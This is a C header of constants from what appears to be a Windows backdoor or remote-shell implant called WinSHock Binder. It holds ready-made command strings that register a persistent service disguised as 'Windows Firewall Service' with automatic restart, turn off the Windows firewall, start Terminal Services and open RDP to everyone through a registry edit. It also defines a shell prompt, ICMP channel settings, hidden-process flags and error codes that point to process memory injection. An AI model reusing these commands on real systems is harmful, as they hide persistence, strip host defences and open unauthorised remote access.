// WinSHock Binder (WsBind) Constants Stub
//
// Copyright (C) 2020 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published
// by the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

#ifndef WSB_LOADED

#define WSB_LOADED 1

#define WSB_NULLS "\0"
#define WSB_LSTRING 256
#define WSB_NEWLINE "\n\0"

#define WSB_FAIL 0
#define WSB_SUCCESS 1

#define WSB_TRUE 1
#define WSB_FALSE 0

#define WSP_HIDDEN_PROC 1
#define WSP_NON_HIDDEN_PROC 0
#define WSP_NO_USER "NONE_MAPPED"
#define WSP_HIDDEN_ATTR 0x08000000

#define WSC_ICMP_CHUNK 64
#define WSC_ICMP_WAIT_TIME 1250

#define WSS_BASIC_EXIT "exit\n\0"
#define WSS_BASIC_PROMPT "WinSh0ck[%d]> \0"

#define WSW_SVC_PATH_END ".exe"
#define WSW_SVC_PATH_ARGS "%s %s\0"
#define WSW_SVC_START "sc start %s\0"
#define WSW_SVC_PATH_START "C:\\Windows\\system32\\"
#define WSW_SVC_SET_START "sc config %s start= %s\0"
#define WSW_SVC_INSTALL "sc create %s binPath= \"%s\"\0"
#define WSW_SVC_DEFAULT_NAME "Windows Firewall Service\0"
#define WSW_SVC_SET_FAILURE "sc failure %s reset= 0 actions= restart/%d\0"

#define WSW_CMD_TS_ENABLE "sc start TermService\0"
#define WSW_CMD_FIREWALL_OFF "netsh firewall set opmode disable\0"
#define WSW_CMD_TS_ALLOW_ALL "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\0"

#define WSB_ERROR_COMM_UNRESOLVED           -1000
#define WSB_ERROR_COMM_NO_RESULTS           -1003
#define WSB_ERROR_COMM_INVALID_SOCK         -1001
#define WSB_ERROR_COMM_ICMP_BAD_HANDLE      -1004

#define WSB_ERROR_SHELL_INIT_BAD_SOCK       -1100
#define WSB_ERROR_SHELL_INIT_BAD_RESP       -1101

#define WSB_ERROR_PROC_DEBUG_NO_TOKEN       -1200
#define WSB_ERROR_PROC_DEBUG_CANT_LOOKUP    -1201
#define WSB_ERROR_PROC_DEBUG_CANT_ADJUST    -1202
#define WSB_ERROR_PROC_MEM_NO_HANDLE        -1203
#define WSB_ERROR_PROC_MEM_NO_ADDRESS       -1204
#define WSB_ERROR_PROC_MEM_NO_ALLOC         -1205
#define WSB_ERROR_PROC_MEM_NO_WRITE         -1206
#define WSB_ERROR_PROC_EXEV_NO_PIPE         -1207
#define WSB_ERROR_PROC_EXEV_NO_SET_PIPE     -1208
#define WSB_ERROR_PROC_EXEV_CMD_NO_EXIST    -1209

#define WSB_ERROR_UTIL_CANT_OPEN_FILE       -1300

#endif